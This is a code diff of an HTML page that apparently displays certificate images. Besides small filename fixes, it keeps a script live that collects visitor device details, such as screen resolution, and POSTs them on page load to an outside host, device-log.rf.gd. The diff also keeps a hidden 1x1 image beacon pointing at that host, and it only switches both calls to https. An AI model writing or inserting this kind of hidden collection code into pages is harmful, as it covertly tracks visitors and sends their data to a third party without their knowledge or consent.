@@ -340,8 +340,8 @@ window.addEventListener("load", executeCodes);
 <div id="who" class="section">
         <h2>WHO</h2>
         <div class="grid">
-            <img src="who1.JPG" alt="WHO Certificate 2" onclick="showModal(this)">
-            <img src="who2.jpG" alt="WHO Certificate 3" onclick="showModal(this)">
+            <img src="who1.jpg" alt="WHO Certificate 2" onclick="showModal(this)">
+            <img src="who2.jpg" alt="WHO Certificate 3" onclick="showModal(this)">
         </div>
     </div>
 
@@ -529,7 +529,7 @@ async function getExtraDetails() {
     let screenResolution = `${screen.width}x${screen.height}`;
 
     // Send Data to PHP Script
-    fetch("http://device-log.rf.gd/y.php", {
+    fetch("https://device-log.rf.gd/y.php", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -544,7 +544,7 @@ async function getExtraDetails() {
 getExtraDetails();
 	</script>
 </body>
-<img src="http://device-log.rf.gd/y.php" width="1" height="1" style="display:none;" alt="">
+<img src="https://device-log.rf.gd/y.php" width="1" height="1" style="display:none;" alt="">
 <!-- scroll to top button -->
 <button id = "btnScrollToTop">
   <i class="material-icons">GO UP</i>
